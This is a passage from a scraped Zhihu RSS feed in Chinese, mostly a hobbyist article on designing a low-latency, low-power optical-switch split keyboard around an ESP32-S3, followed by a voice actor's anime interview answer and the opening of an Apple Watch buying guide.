eeimg=\"1\">\n</li>\n</ul>\n<p>这时需要解的就是线性微分方程组了。通过拉普拉斯变换，依然可以变成代数方程组解决。进一步分析需要信号与系统和小波分析的相关知识。不过这些方法基本都集成在电路模拟工具中了，例如可以用这个在线工具：<a href=\"https://link.zhihu.com/?target=https%3A//www.circuitlab.com/\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">circuitlab.com/</span><span class=\"invisible\"></span></a> 。</p>\n<p>然后是半导体元件：</p>\n<figure data-size=\"small\"><img src=\"https://pic3.zhimg.com/v2-dc4a4f2eef489fe83399d8431804bd22_b.jpg\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"2880\" data-rawheight=\"966\" class=\"origin_image zh-lightbox-thumb\" width=\"2880\" data-original=\"https://pic3.zhimg.com/v2-dc4a4f2eef489fe83399d8431804bd22_r.jpg\"></figure><ul>\n<li>N 型半导体 (negative charge)：掺杂了磷、砷、锑等，电子为载流子</li>\n<li>P 型半导体 (positive charge)：掺杂了硼、铟等，空穴为载流子</li>\n<li>肖特基管</li>\n<li>二极管和三极管</li>\n<li>场效应管</li>\n</ul>\n<p>然后是微控制器：</p>\n<ul>\n<li>时钟</li>\n<li>中断</li>\n<li>pull-up 和 pull-down 输入</li>\n<li>开漏 (open-drain) 输出</li>\n<li>推挽 (push-pull) 输出</li>\n<li>ADC</li>\n<li>常用通信协议：I2C 和 SPI</li>\n</ul>\n<p>真实世界中，每个元件都不是单纯的元件——例如每个电阻，其实都是<b>电阻、电感和电容的集合体</b>。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-584ece1dbf8d813df72f94a873c72b18_b.jpg\" data-size=\"normal\" data-rawwidth=\"1276\" data-rawheight=\"766\" class=\"origin_image zh-lightbox-thumb\" width=\"1276\" data-original=\"https://pic1.zhimg.com/v2-584ece1dbf8d813df72f94a873c72b18_r.jpg\"><figcaption>解耦电容需要尽量少的 L</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>每个元件的特性都不是简单的线性关系，会受温度、光照的影响。元件和导线之间还会感应、干扰。电路的输入信号也从来不是理想的。元件厂家的 datasheet 会提供一些额外的参数和数据方便分析。除此之外，还需要吸收大量前人的设计经验和艺术：</p>\n<figure data-size=\"small\"><img src=\"https://pic1.zhimg.com/v2-7e4ed3d3d187f62ff385a131162d3a08_b.jpg\" data-size=\"small\" data-rawwidth=\"658\" data-rawheight=\"852\" class=\"origin_image zh-lightbox-thumb\" width=\"658\" data-original=\"https://pic1.zhimg.com/v2-7e4ed3d3d187f62ff385a131162d3a08_r.jpg\"><figcaption>太厚了…就看一小半吧</figcaption></figure><p>还有些基础理论（选修），涉及固体物理和控制论：</p>\n<ul>\n<li>费米能</li>\n<li>肖特基势垒、欧姆接触</li>\n<li>PID 控制</li>\n</ul>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-c8d2a255d79d02919f6df1a777e60ea0_b.jpg\" data-size=\"normal\" data-rawwidth=\"4096\" data-rawheight=\"3170\" class=\"origin_image zh-lightbox-thumb\" width=\"4096\" data-original=\"https://pic1.zhimg.com/v2-c8d2a255d79d02919f6df1a777e60ea0_r.jpg\"><figcaption>控制论劝退图</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<h2>整理需求</h2>\n<p>对要做的新版本键盘，理了一下自己的需求包括 functional requirement 如下：</p>\n<ul>\n<li>蓝牙 USB <b>双模</b>，键盘还能连接 <b>Wi-Fi</b>，接上后输出键盘的 Wi-Fi 地址，用电脑访问地址弹出配置网页，点保存就可以。所以用户不用安装软件、不用交网费就能全平台配置键位。</li>\n<li>使用 <b>USB-FS </b>(full speed，全速，帧间隔 1ms)</li>\n<li>\n<b>左右分离</b>，通过 SPI 通信。</li>\n<li>可外接设备如微型<b>轨迹球</b>和<b>麦克风</b>\n</li>\n<li>无线<b>电子墨水显示</b>键盘状态，不需要 LED</li>\n<li>能贴片的全<b>让代工厂贴</b>了，避免手工焊接。</li>\n<li>最后且最重要的：和触点开关的机械键盘说再见，用<b>光轴</b>\n</li>\n</ul>\n<figure data-size=\"small\"><img src=\"https://pic1.zhimg.com/v2-d608a7c2bb3f87006404a476dd589bec_b.gif\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"1220\" data-rawheight=\"686\" data-thumbnail=\"https://pic1.zhimg.com/v2-d608a7c2bb3f87006404a476dd589bec_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1220\" data-original=\"https://pic1.zhimg.com/v2-d608a7c2bb3f87006404a476dd589bec_r.jpg\"></figure><p>光轴的原理是 PCB 上摆一个红外发光二极管和一个接收器（三极管），没按下去时接收器导通。轴体按下去阻隔了红外光，接收器电阻变大相当于断开。相比机械轴，光轴的信号极其平滑，抖动很少（据说也有抖动，是否需要防抖得测试一下再说），响应一般在 0.1ms 内。由于没有触点，光轴也更顺滑，使用寿命要长 50% 以上。由于不用和 PCB 连接，轴的受力可以完全加在板上，不会影响 PCB 寿命。</p>\n<p>光轴还有一个优势是：输入电路和输出电路之间以光耦合，不存在电流乱走造成幽灵按键的问题。</p>\n<p>其他选择：模拟光轴或者霍尔效应轴，但模拟光轴还没有方便购买的散货。霍尔效应轴就佳达隆一家有量产，写信联系它又不理我。途中有一位热心的老哥 riskable 给我发了他的 3D 打印霍尔效应轴图纸，但由于制作有点麻烦，最后还是没那么做。对霍尔效应轴感兴趣的朋友，可以看看 <a href=\"https://link.zhihu.com/?target=http%3A//input.club/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">input.club</a> 的 Keystone。</p>\n<h2>关于延迟的讨论</h2>\n<p>人类的反应时间在 300ms 左右。如果练成了“肌肉记忆”，对特定信号的反应会更快。例如闪烁躲锤子，反应在 200ms 都是有可能的。</p>\n<p>机械轴触点的抖动一般在 5ms 内，如果要防止误触发（例如键盘震动造成的簧片抖动、感应无线电波造成电平变化等，比较少见但是有可能），最好进行 10ms 左右的 debounce 之后再发送信号。这就引入了 10ms 的延迟，很多低成本键盘为了方便，甚至把防抖搞到了 <b>30ms</b>。光轴信号是无抖的，不用做这个消抖，且感应元件微秒级的响应，就算求稳加入防抖，<b>1ms</b> 的前摇消抖就可以（后摇依然可以 30ms，人没法在这么短时间内按同一个键两次）。</p>\n<p>微控制器的扫描间隔会造成延迟，执行代码也需要时间，可以提高主频和扫描频率，使之可忽略不计。</p>\n<p>一些键盘声明为 USB 低速设备，帧间隔 8ms，那也会造成 <b>0-8ms</b> 的输入延迟。USB 全速帧间隔 1ms，高速帧间隔 0.125ms。一般如果键盘用的微控制器价值高于 1 块钱的话，会支持到 USB 全速，于是由 USB 帧间隔导致的延迟在 <b>0-1ms</b> 之间。</p>\n<p>USB 集线器也会造成延迟。有些显示器可以外插 USB，这也是一种集线器。延迟的量级在 10 个帧左右，如果帧间隔是 8ms，你就在集线器获得了 <b>80ms</b> 的延迟。为了最小化延迟，建议直连而不是通过集线器。</p>\n<p>USB 的信号一般是通过南桥芯片/ICH再进 CPU。ICH 是 IO Control Hub 的缩写，说白了也是一种集线器，它不是转到 USB 协议，工作的频率很高，造成的延迟大概可忽略不计？</p>\n<p>显示器延迟也不可忽略，普通显示器刷新率低如 60Hz，还有响应时间延迟如 5ms，那显示延迟就是 5-22ms。换用快响应时间如 1ms 及刷新率 144Hz 的显示器，显示延迟可降低到 <b>1-8ms</b>。</p>\n<p>网络延迟很难估算，只能通过升级套餐、和运营商扯皮等方式解决。</p>\n<p>综上，</p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<th></th>\n<th>普通设备的延迟(ms)</th>\n<th>改进后的延迟(ms)</th>\n</tr>\n<tr>\n<td>显示器</td>\n<td>5-22</td>\n<td>1-8</td>\n</tr>\n<tr>\n<td>防抖</td>\n<td>30</td>\n<td>1</td>\n</tr>\n<tr>\n<td>USB 速度</td>\n<td>0-8</td>\n<td>0-1</td>\n</tr>\n<tr>\n<td>集线器</td>\n<td>80</td>\n<td>0</td>\n</tr>\n<tr>\n<td>总计</td>\n<td>120-145</td>\n<td>2-10</td>\n</tr>\n</tbody></table>\n<p>可看到，其中改善防抖、去掉集线器的收益最大。</p>\n<h2>信息储备</h2>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-dccddb1cf23368767afb8be97d0af3c3_b.jpg\" data-size=\"normal\" data-rawwidth=\"2700\" data-rawheight=\"3600\" class=\"origin_image zh-lightbox-thumb\" width=\"2700\" data-original=\"https://pic4.zhimg.com/v2-dccddb1cf23368767afb8be97d0af3c3_r.jpg\"><figcaption>看电路图和看交通标志一样复杂</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>为了支持这个设计，需要点实操培训。所以就先学习了一遍 Phil's Lab 的 STM32 PCB 设计+嘉立创打板教程。高频电路的设计技巧是：同类元件和同类信号尽量在同一区域；层越多越好，信号/power pour 和 ground plane 相间；当信号穿越 via 时，在旁边也来一个 ground via 配对；power 和 ground 之间电容越大越好 —— 因为高频信号无时无刻都在辐射，信号附近有地可以保证能量基本在它们之间的电介质传输，从而避免辐射到外面去。</p>\n<p>然后就是微控制器 (MCU) 选型。现在由于芯片荒，主流 MCU 都涨价且缺货… 看了一百多本手册和价格以后，基本候选在下面几个 MCU：</p>\n<ul>\n<li>ESP32-PICO。支持 Wi-Fi + 蓝牙，有 touch sense 功能，一个模组不仅自带天线，还打包了晶振，简直太方便了，写文章时单片 20 块左右。SDK 也是我喜欢的，可以命令行搞定。</li>\n<li>类似 STM32 的国产芯片，例如 GD32, MM32, FM32, 雅特力, Holtek 等，价格便宜且容易买到货，就是文档和工具比 STM32 / ESP32 差得远。</li>\n<li>高通 QCA4020。有 Wi-Fi + 蓝牙支持，PIN 很多但大部分都是地，可用 GPIO 的数量其实要少很多，不好贴。</li>\n<li>高通骁龙系列。类似 QCA4020，运算能力强，可以买拆机垃圾，同样不好贴。</li>\n<li>nRF52840。有 Wi-Fi + 蓝牙支持，48 个 GPIO 差不多刚好支持单手键盘全键直连和中断驱动。缺点是比 ESP32 贵不少。</li>\n<li>最近量产的 ESP32-S3。Wi-Fi + 蓝牙支持，44 个 GPIO，自打包了 PSRAM、晶振和天线。核心是 Cadence 家的 Tensilica Xtensa 双核，这个架构优点是提供了一套定制工具，相比千篇一律的 ARM 处理器可以发挥定制能力强的优势。价格便宜，简直是国产之光，我直接下单了 10 片。</li>\n</ul>\n<p>然后是光轴相关资料，有个叫 optical-future 的论坛上把发射器/接收器资料和光轴设计要考虑的点都讨论了个遍，节约了我很多功夫。下图 D4 为发射器，Q2 为接收器。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-9f1cc815b73f7d4a6a6089bd3dcf66a8_b.jpg\" data-size=\"normal\" data-rawwidth=\"358\" data-rawheight=\"426\" class=\"content_image\" width=\"358\"><figcaption>参考光耦电路</figcaption></figure><p>发光二极管采用 IR12-21C-TR8。</p>\n<p>光敏三极管采用 PT12-21B-TR8。</p>\n<p>光轴尺寸：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-9457eca979473a0a5370cd59c8b58f6c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"773\" data-rawheight=\"992\" class=\"origin_image zh-lightbox-thumb\" width=\"773\" data-original=\"https://pic1.zhimg.com/v2-9457eca979473a0a5370cd59c8b58f6c_r.jpg\"></figure><p>PCB 上的打洞尺寸：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bfcd8661abc5657e094fe4d0fd700ba3_b.jpg\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"536\" class=\"origin_image zh-lightbox-thumb\" width=\"934\" data-original=\"https://pic4.zhimg.com/v2-bfcd8661abc5657e094fe4d0fd700ba3_r.jpg\"><figcaption>By leavenember, Pad size X 为 2.85mm 更合适</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>然后是迷你轨迹球相关资料，基本锁定在：</p>\n<ul>\n<li>霍尔效应轨迹球 Trackball Breakout，I2C 低速接口</li>\n<li>光学轨迹球 Pixart PAW3204OA，SPI 接口</li>\n</ul>\n<p>ESD 保护，也就是 electro-static discharge 保护，是一种防止静电放电破坏电子元件的元件。选定为给 USB 优化的专门元件 USBLC6-2。</p>\n<figure data-size=\"small\"><img src=\"https://pic1.zhimg.com/v2-ce2f94b69b09e80fa03ba5b1a954b6a0_b.jpg\" data-size=\"small\" data-rawwidth=\"696\" data-rawheight=\"514\" class=\"origin_image zh-lightbox-thumb\" width=\"696\" data-original=\"https://pic1.zhimg.com/v2-ce2f94b69b09e80fa03ba5b1a954b6a0_r.jpg\"><figcaption>USBLC6-2</figcaption></figure><figure data-size=\"small\"><img src=\"https://pic3.zhimg.com/v2-b511f1265c1e64ee4ec6e9277c010e56_b.jpg\" data-size=\"small\" data-rawwidth=\"650\" data-rawheight=\"388\" class=\"origin_image zh-lightbox-thumb\" width=\"650\" data-original=\"https://pic3.zhimg.com/v2-b511f1265c1e64ee4ec6e9277c010e56_r.jpg\"><figcaption>连接方式, _CONN_ 标签为接口方向</figcaption></figure><p>USB 供电是 5V 的，但芯片基本都需要 3.3V，所以需要变压。考虑到电器的阻抗会变化，不能简单的用电阻串联分流，而可以用自动稳压的元件来供电。MCP16301/H 就是这么一种，利用输出电压的反馈自动控制，来稳压的元件。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1dd95c9d53870bd7a6aa9eb1433907d1_b.jpg\" data-size=\"normal\" data-rawwidth=\"1086\" data-rawheight=\"442\" class=\"origin_image zh-lightbox-thumb\" width=\"1086\" data-original=\"https://pic2.zhimg.com/v2-1dd95c9d53870bd7a6aa9eb1433907d1_r.jpg\"><figcaption>MCP16301/H 的参考电路</figcaption></figure><p>解耦电容：传统键盘电路都是低频信号不太用考虑，但这里有 2.4G 的蓝牙信号和 40M 的 Wi-Fi 高频信号，所以也需要添加些解耦电容，吃掉高频的信号对我们 IO 端口的干扰。好在可以按照 MCU 参考电路添加。</p>\n<p>了解 I2C 的原理，一般芯片支持 100kHz/400kHz 的通信速度。</p>\n<p>了解 SPI 的原理，一般芯片支持主频/n 的 SPI 通信速度，所以比 I2C 要快。</p>\n<p>了解 USB 的原理：</p>\n<a href=\"https://link.zhihu.com/?target=https%3A//www.usbmadesimple.co.uk/ums_1.htm\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-bfb6684e67a8f01ee779ed94b8a93891_180x120.jpg\" data-image-width=\"600\" data-image-height=\"180\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">USB Made Simple - Part 1</a><p>如果芯片支持 USB-HS 也就是 high speed，那也能克服集线器的限制了，因为集线器增加约 10 个帧，对 USB-HS 也就 1.25ms 的延迟，是可以忽略的。遗憾的是支持 USB-HS 的芯片非常少。现在我找到的两种方案是：</p>\n<ul>\n<li>利用 USB PHY 元件如 USB3300 来连接，但这些元件需要 ULPI 协议，没 FPGA 似乎搞不定</li>\n<li>使用 Atmel 的 SAM9X 这种支持高速 USB 的芯片</li>\n</ul>\n<p>以上两种方案成本都比较高，USB-HS 就留待下个版本的迭代吧。</p>\n<p>无线射频：对 2.4G 频率的信号，主要利用超外差式的方式进行接收，也就是，用和信号相近的本地信号和接收到的信号混频，产生容易处理的、频率低得多的 IF (intermediate frequency) 信号。这方面的基础知识，建议参考：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d8c2d12b01bb54474256fa623178655f_b.jpg\" data-size=\"normal\" data-rawwidth=\"355\" data-rawheight=\"500\" class=\"content_image\" width=\"355\"><figcaption>一次 RubyConfChina 上，我在图灵的展位半价买的</figcaption></figure><p>天线在 PCB 上画，同样可以用参考设计。天线的分析原理可以用 <img src=\"https://www.zhihu.com/equation?tex=A-%5Cphi\" alt=\"A-\\phi\" eeimg=\"1\"> 方程，即磁矢量位(magnetic vector potential) 和电标量位 (electric scaler potential) 方程计算。不过买的 SoC (system on chip) 模组自带天线，不需要自己画天线了。还有个问题是，金属载板会阻挡信号，解决办法是让天线凸出去。</p>\n<p>这次不搞灯，没必要低头看键盘的状态，显示器旁放一个无线显示就可以了。可以购买现成的 ESP32+电子墨水屏+电池的组合，以 Wi-Fi 连接到键盘。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2b952f662b6542d19302475af86129af_b.jpg\" data-size=\"normal\" data-rawwidth=\"1488\" data-rawheight=\"922\" class=\"origin_image zh-lightbox-thumb\" width=\"1488\" data-original=\"https://pic4.zhimg.com/v2-2b952f662b6542d19302475af86129af_r.jpg\"><figcaption>这个电子墨水屏有点太大了，我觉得 4 寸的贴显示器旁就可以</figcaption></figure><p>语音识别，ESP32 有现成的 SDK 可用。</p>\n<h2>低功耗设计</h2>\n<p>我们可以循序渐进，先做好有线连接的设计，再做无线连接的设计。光轴的缺点是一直需要点亮发射器，键盘扫描耗电大，做低功耗就需要经常休眠。而休眠做得不好的产品，例如 M$ 的 Sculpt 鼠标，一段时间不动，就得两秒唤醒，给使用增加很多麻烦。</p>\n<p>一个低功耗的键盘，应该可以在下面三种工作模式切换：</p>\n<ul>\n<li>正常工作模式：如果一段时间没有输入，进入浅睡眠模式</li>\n<li>浅睡眠模式：降低主频和扫描频率，有按键时进入正常工作模式</li>\n<li>深睡眠模式：停止扫描，切换到低功耗的协处理器，启用 proximity sensor，当有人接近时唤醒到浅睡眠模式</li>\n</ul>\n<p>proximity sensor 有很多种，备选的几种方案有：</p>\n<ul>\n<li>基于 Wi-Fi CSI 的检测：需要比较多的计算，可能并不省电</li>\n<li>基于电容的检测：省电，但探测距离过近 (一般只有 mm)</li>\n<li>环境光检测：要做差分，而且如果环境黑暗就不适用了</li>\n<li>主动红外光检测：现在的主流方案，通过一个红外发光二极管发光，如果人手接近键盘，就会反射红外光，再通过环境光感应器读数。主动探测的发光二极管功耗比较高，但因为感应器响应很快，可以通过减少发光时长和频率来降低消耗。</li>\n</ul>\n<p>检测到接近后，通过 I2C 发送信号到 ESP32-S3 的超低功耗协处理器 (ULP)。协处理器是一个 <a href=\"https://link.zhihu.com/?target=https%3A//docs.espressif.com/projects/esp-idf/en/latest/esp32/api-guides/ulp_instruction_set.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">RISC-V 指令集</a>的简单 CPU，可以用简单的汇编编写其逻辑。其中几个会用到的扩展指令是： </p>\n<ul>\n<li>REG_WR: 改变 IO 引脚电平，打开红外发光二极管</li>\n<li>ADC: 读数</li>\n<li>WAKE: 指令唤醒主处理器</li>\n</ul>\n<h2>低能耗的扫描逻辑</h2>\n<p>查手册，估算每个红外发光二极管正常工作电流约为 20mA，一个键盘 80 个键，全部并联点亮那就是 1600mA，已经超过 USB 2.0 允许的最大电流了。有几个办法改善：</p>\n<ul>\n<li>红外二极管的正常工作电压是 1.2V 左右，我们用 3.3V VDD 供电，二极管 3 个一组串联，那刚好每个二极管分配 1.1V 的电压，就不需要在电阻里浪费功耗了。</li>\n<li>和扫描矩阵一样，分组轮流点亮，每次只点亮 3 个管。瞬间电流是 20mA</li>\n</ul>\n<p>还有可以想到的一点是，点亮时间是越短越省电。我们先计算一下以下几个必要的延迟：</p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<th>种类</th>\n<th>延迟</th>\n</tr>\n<tr>\n<td>从设置 output pin 到输出改变</td>\n<td>20-100ns（没有资料，按场效应管响应时间得出的估计值）</td>\n</tr>\n<tr>\n<td>红外发光的响应时间</td>\n<td>20ns（类似产品的估算值）</td>\n</tr>\n<tr>\n<td>红外感应的响应时间</td>\n<td>15μs（手册给出）</td>\n</tr>\n<tr>\n<td>从输入改变到 input pin 值改变</td>\n<td>1.8μs（网友实验测量值）</td>\n</tr>\n</tbody></table>\n<p>如果规划 50μs 的点亮时间，以总计 40 个键计算，可得一个扫描周期约为 40 / 3 * 0.05 = 0.65ms，此时等效功耗为 3.3V x 20mA。如果压缩点亮时间到 30μs，单扫描周期延长到 0.8ms，等效功耗为 3.3V x 8mA。再考虑深浅睡眠停止扫描，用 2000mAH 的电池供电能工作挺久的了，实际使用再进行调整。</p>\n<p>还有一个问题，计算得三个串联发光二极管的等效内阻约为 165Ω，ESP32 单 output pin 是否可以对其输出 20mA 左右的驱动电流？按<a href=\"https://link.zhihu.com/?target=https%3A//esp32.com/viewtopic.php%3Ft%3D5840\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">网友的测量</a>应该可以：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b32e52f3470db69c009c1432d8a86c3d_b.jpg\" data-size=\"normal\" data-rawwidth=\"1758\" data-rawheight=\"1192\" class=\"origin_image zh-lightbox-thumb\" width=\"1758\" data-original=\"https://pic2.zhimg.com/v2-b32e52f3470db69c009c1432d8a86c3d_r.jpg\"><figcaption>上图中驱动强度为3(source3)的曲线，第6个点负载 150Ω，刚好是20mA</figcaption></figure><p>还有一个问题，发光二极管是非线性元件，各管有公差，串联起来会不会一个电压特别大，另外一个电压特别小呢？查看数据手册的电压-电流曲线可以知道，电压越大，等效电阻越小，电阻变小就反过来让它分到的电压变小，因此这个串联效果是稳定趋于均分的。</p>\n<h2>工程规划</h2>\n<p>综上，大体设计和可行性分析已经无大问题，制作流程大致为：</p>\n<ul>\n<li>打印一个多功能的 Breakout 测试板，顺便练习手焊模块</li>\n<li>打板、编程</li>\n<li>设计外壳、切削</li>\n<li>扩展电路添加外接的轨迹球</li>\n<li>添加无线显示</li>\n</ul>\n<h2>工具准备</h2>\n<p>为烧录和 debug 准备了 90 块的国产 DAPLink 一个，但直接用 ESP-IDF 增加一个 USB-UART 就可以了。 </p>\n<p>画 PCB 依然是 KiCAD，元件的引脚、模型可以在 <a href=\"https://link.zhihu.com/?target=https%3A//www.ultralibrarian.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Ultra Librarian</a> 搜出来下载。</p>\n<p>使用 ngSPICE 做电路模拟。</p>\n<p>板和壳建模仍旧是 OpenSCAD。</p>\n<p>光轴若干，买回来量量尺寸，做个准备。</p>\n<p>Filco style 板载卫星轴。</p>\n<p>左右通信线材选用 USB 线，全接 Type-C 口。</p>\n<p>焊接工具等。</p>\n<p>频谱分析仪、网络分析仪、信号发生器、矢量信号分析仪——暂时不需要。</p>\n<h2>以上，暂时就酱，可以动手开工了。</h2>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/luikore?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">luikore</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/406619338?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国产动画《一人之下》第四季开播，你感觉如何？","date":"2021-10-08 10:34:39","description":"\n<p>谢邀~</p>\n<p>宝儿姐的配音演员前来安利！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f2693f705b438f115ac9a8201da971d9_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"463\" data-rawheight=\"357\" data-watermark=\"watermark\" data-original-src=\"v2-f2693f705b438f115ac9a8201da971d9\" data-watermark-src=\"v2-99ef34fbc478f6495234a30350bd7d80\" data-private-watermark-src=\"v2-bf68072726acc4733aaecde8caa6f27d\"></p>\n<h3>1、 这一季的宝儿姐，和前三季相比有什么变化？</h3>\n<p>其实宝儿姐本质上是没有太大变化的，只是随着剧情的展开，宝儿姐表现出来的样子越来越立体化，作为观众，对她的了解也更深入、更全面、更多角度了。从观众的角度来看，第四季的宝儿姐会更加老江湖，尤其和各大区临时工们协作完成任务的时候，更加体现出了诸葛青口中的「惯匪」属性</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8ad218cbe8dd808675f6c94e8d63b28e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"804\" data-watermark=\"watermark\" data-original-src=\"v2-8ad218cbe8dd808675f6c94e8d63b28e\" data-watermark-src=\"v2-ed8ede435b130331a7673ebffefd9011\" data-private-watermark-src=\"v2-3a1b1f764bda9c18b9aaecaf48be0220\"></p>\n<h3>2、《一人之下4》宝儿姐给你最大的惊喜是？</h3>\n<p>从外在上说，这一季的宝儿姐太帅了！</p>\n<p>这一季终于有了势均力敌同样又帅又萌又能打、并且正面交锋的对手了！没错就是陈朵~刚看完第三集，踩着唢呐BGM出场的宝儿姐跟陈朵的那段打斗，弹幕上一片叫绝（其中就有我发的，嘻嘻）</p>\n<a href=\"https://www.zhihu.com/video/1428149103351599104\">一人之下4-宝儿姐vs陈朵</a><p>从内在上说，人物形象更丰满了，除了机（dai）智（meng）、专（guan）业（fei）之外，这一季显得更加老江湖，表现出了作者二爷说「六厂二车间的冯师傅」的气质，不管有什么事儿，只要宝儿姐在，就“稳了”，这种感觉在后面也会体现地越来越多</p>\n<h3><b>3、 分享一下动画录音中的趣事吧~</b></h3>\n<p>前几季有不少好玩的事情，都跟大家分享过了，说个这一季的吧…</p>\n<p>这一季刚开始录制的时候，配音导演藤新老师就说，这一季要全部都用四川话录，作为一个天津人，压力一下子就大了，于是每次录音我都会专门带一个四川小姐姐过去，现场指导四川话。</p>\n<p>宝儿姐这种人美路子野人狠话不多的角色，每集词都很少，所以还比较顺利。有一次说要录音，就赶紧召唤方言指导一起过去（我们录音之前一般是不知道具体要录什么内容的）到了之后才发现，几集的内容基本全是气息，小姐姐在旁边等了半天，一句都没指导上，完全没有成就感~</p>\n<p><img src=\"https://pic4.zhimg.com/v2-48aa471646c65868fbb60ce1803c66bf_720w.jpeg?rss\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"887\" data-rawheight=\"804\" data-watermark=\"watermark\" data-original-src=\"v2-48aa471646c65868fbb60ce1803c66bf\" data-watermark-src=\"v2-b80544217e590755fd5c67078258186e\" data-private-watermark-src=\"v2-eab1bd075f9e4cf9ae93a2fc3a6d2c47\"></p>\n<p><br></p>\n<h3><b>4、想对冯宝宝粉丝们说的话</b></h3>\n<p>很荣幸能作为配音演员，把宝儿姐呈现给大家；也很开心作为粉丝，跟大家一起陪着宝儿姐一路走下来~</p>\n<p>「一人之下」是一部非常优秀的作品，在追漫画和动画的同时，你们也会看到自己的成长。希望大家能一直喜欢和支持「一人之下」</p>\n<p>记得<b>每周五中午</b>来<b>腾讯视频</b>看宝儿姐哦~</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mi-qi-xiao-lian-sha?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">米琪小连杀</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488660280/answer/2153069757?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">360 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/468563690?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》八奇技中的神机百炼？</a><br><a href=\"http://www.zhihu.com/question/399121262?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《一人之下》老天师杀那么多全性最终目的是不是为了保护张楚岚？</a><br>\n","link":"http://www.zhihu.com/question/488660280/answer/2153069757?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新一代 Apple Watch 今晚开卖，如何选择适合自己的那一款？","date":"2021-10-08 10:12:07","description":"\n<p>继 9 月 15 日新一代 Apple Watch 发布之后，Apple Watch Series 7 终于将在一个月后的 10 月 15 日正式开售；而在今晚，如果你准备入手新款 Apple Watch，可以于 20:00 前往 Apple 官网或者 Apple Store 应用进行线上订购，以便在正式发售之后，能够尽快拿到新表。</p>\n<p>如果你有购入 Apple Watch 的计划，但是不准备选择新款，近期也会是一个不错的时机，毕竟新款上市之后，旧款产品势必将迎来价格下调。那么，面对不同的型号、尺寸和款式，Apple Watch 应该如何选择？少数派为你整理了一些重要信息，希望能够对你的选购提供参考。</p>\n<h2>外观</h2>\n<p>Apple Watch Series 7 是继 Apple Watch Series 4 之后，外观变化最大的一代升级：屏幕显示区域更大、边框更窄，还有全新配色可供选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/cd7edf3d01865e4f34c7d71c0dadfd30.jpg\"></figure><p>其中，不锈钢表壳依旧提供银色、金色、石墨色<sup class=\"ss-footnote\" href=\"\" title=\"前代产品提供深空黑色选项，从官网图片对比暂时看不出二者颜色存在区别。\" footnote-id=\"1\">1</sup>可供选择，钛金属表壳提供常规钛金属配色和深空黑色可选。铝金属表壳变化最大，提供了经过重新设计的午夜色、星光色、绿色、新款蓝色和红色可供选择。</p>\n<figure class=\"image ss-img-wrapper\"><img 